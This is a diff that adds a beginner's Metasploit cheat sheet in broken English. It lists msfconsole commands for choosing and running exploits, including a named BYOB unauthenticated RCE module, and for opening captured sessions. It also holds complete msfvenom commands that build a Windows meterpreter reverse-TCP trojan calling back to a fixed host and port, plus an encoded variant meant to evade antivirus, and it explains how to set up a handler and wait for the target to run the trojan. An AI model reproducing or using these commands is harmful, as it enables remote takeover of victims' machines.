@@ -1,0 +1,52 @@
+1-msfconsole  => to run mestasploit
+2-search (name)
+
+2-show payloads
+
+3-set payload (payload name)
+
+3-show exploit
+
+4-use exploit/unix/webapp/byob_unauth_rce => use (path exploit)
+
+5-info => to see information 
+
+6-show options => to see all can do.
+
+Note: if you need to change any name of options you should write => set (name) (new value)
+
+7-show targets
+
+8-set target (target number)
+
+9-exploit => to run 
+
+
+
+
+
+10-quit  => to exit the metasploit
+
+11-searchsploit (name) (version)
+
+
+
+
+12-sessions => if target try login and want see active sessions 
+13->sessions -i 1 => try login by any number of active session you have 
+
+
+
+14-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.21.103.247 LPORT=5555 -f exe -o podaBH.exe
+
+this will create Trojan connect to  this host and this port 
+this normal 
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.21.103.247 LPORT=5555 -e x64/zutto_dekiru -i 15 -n 500 -f exe -o podaBH.exe
+
+this hard 20%
+
+15-go by your host to msfconsole and use exploit/multi/handler and set LHOST and LPORT 
+16-run and wait your target run your trojan to get session open 
+
+17-hexeditor podaBH.exe => edit any file by hexeditor you should be root user to save .
